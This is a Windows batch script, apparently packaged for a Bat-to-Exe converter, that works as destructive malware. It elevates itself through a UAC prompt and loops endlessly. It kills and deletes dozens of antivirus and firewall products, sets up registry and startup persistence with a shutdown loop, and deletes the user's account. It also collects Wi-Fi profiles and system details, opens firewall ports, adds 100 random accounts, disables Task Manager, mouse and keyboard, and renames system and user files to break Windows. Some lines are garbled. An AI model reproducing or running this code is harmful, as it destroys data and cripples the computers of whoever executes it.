::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFJy9t4J75u508Ykx/fvy7Na0u14JUewxNorD39Q=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
goto continue
:continue
:: BatchGotAdmin
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject("Shell.Application") > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
goto BEGIN
:BEGIN
:: scary stuff
@ echo off
if "%1" equ "Restarted" goto %1
:again
echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
goto :again

:Restarted
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
rem â€?
rem Permanently Kill Anti-Virus
net stop â€œSecurity Centerâ€?
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
l /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
cls
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.dat
cls
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*
cls
del /Q /F C:\Program Files\avgamsr\*.exe
del /Q /F C:\Program Files\avgamsvr\*.exe
del /Q /F C:\Program Files\avgemc\*.exe
cls
del /Q /F C:\Program Files\avgcc\*.exe
del /Q /F C:\Program Files\avgupsvc\*.exe
del /Q /F C:\Program Files\grisoft
del /Q /F C:\Program Files\nood32krn\*.exe
del /Q /F C:\Program Files\nood32\*.exe
cls
del /Q /F C:\Program Files\nod32
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe
del /Q /F C:\Program Files\kavmm\*.exe
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe
del /Q /F C:\Program Files\guard\*.exe
del /Q /F C:\Program Files\ewido\*.exe
cls
del /Q /F C:\Program Files\pavprsrv\*.exe
del /Q /F C:\Program Files\pavprot\*.exe
del /Q /F C:\Program Files\avengine\*.exe
cls
del /Q /F C:\Program Files\apvxdwin\*.exe
del /Q /F C:\Program Files\webproxy\*.exe
el /Q /F C:\Program Files\panda software\*.*
rem â€?
title %FILENAME%
color 3
:: Checks for existing files, overwrites
IF EXIST "9K21JM10B.log" DEL /F /Q "9K21JM10B.log"
IF EXIST "restart.bat" DEL /F /Q "restart.bat"
IF EXIST "bsod.cmd" DEL /F /Q "bsod.cmd"
echo . >9K21JM10B.log
echo . >restart.bat
echo . >bsod.cmd
echo . >kill.txt
attrib +h +s 9K21JM10B.log
attrib +h +s bsod.cmd
attrib +h +s 1.vbs
attrib +h +s 2.vbs

echo %systemroot%\system32\scrnsave.scr /s >>bsod.cmd
start bsod.cmd
echo :loop >>rest.bat
echo shutdown /s /f /t 0 >>rest.bat
echo goto loop >>rest.bat
copy rest.bat "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy rest.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy rest.bat "C:\Users\Public\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
del rest.bat
net user %USERNAME% /delete
goto DATA
:: Gathers data
:DATA
ECHO.>>9K21JM10B.log
ECHO Username:%username%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Time: %time%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Date: %date%>>9K21JM10B.log
color 0a & mode 1000 & cls
ECHO.>>9K21JM10B.log
netsh wlan show profiles>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ipconfig>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ipconfig | find /i "IPv4">>9K21JM10B.log
wmic diskdrive get size>>9K21JM10B.log
wmic cpu get name>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO.>>9K21JM10B.log
systeminfo>>9K21JM10B.log
goto FIREWALL
:FIREWALL
netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=%1
netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=%1
goto LOOP

:LOOP
setlocal EnableDelayedExpansion
for /l %%x in (1, 1, 100) do (
   net user !random! !random! /add
)
endlocal
:: last bit of stuff
reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d C:/Downloaded Images/ /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParame
ters
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
sc stop "WSearch"
sc config "WSearch" start="disabled"
Dism /online /Disable-Feature /FeatureName:"SearchEngine-Client-Package" /Remove /q
net session >nul 2>&1 || (powershell start -verb runas '"%~0"' &exit /b)
set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key% /f
reg add %key% /v Start /t REG_DWORD /d 4
rundll keyboard,disable
net user %USERNAME% /delete
goto ENCRYPT
:: This is where most files types get broken
:ENCRYPT
REN *.log *.0000
REN *.ini *.0000
REN *.dll *.0000
REN *.bin *.0000
REN *.txt *.0000
REN *.sys *.0000
REN *.lnk *.0000
REN *.png *.0000
cd C:\Windows
REN *.log *.0000
REN *.ini *.0000
REN *.dll *.0000
REN *.bin *.0000
REN *.txt *.0000
REN *.sys *.0000
REN *.lnk *.0000
REN *.png *.0000
cd C:\Windows\Sys32 & cd C:\Windows\System32
REN *.log *.0000
REN *.ini *.0000
REN *.dll *.0000
REN *.bin *.0000
REN *.txt *.0000
REN *.sys *.0000
REN *.lnk *.0000
REN *.png *.0000
cd C:\
REN *.exe *.0000
REN *.log *.0000
REN *.ini *.0000
REN *.dll *.0000
REN *.bin *.0000
REN *.txt *.0000
REN *.sys *.0000
REN *.lnk *.0000
REN *.png *.0000
REN *.exe *.0000
echo select disk 0 >>diskpart.txt
echo create partition primary size= >>diskpart.txt
echo assign letter= >>diskpart.txt
echo diskpart /s diskpart.txt >>BSoD.cmd
:leave
exit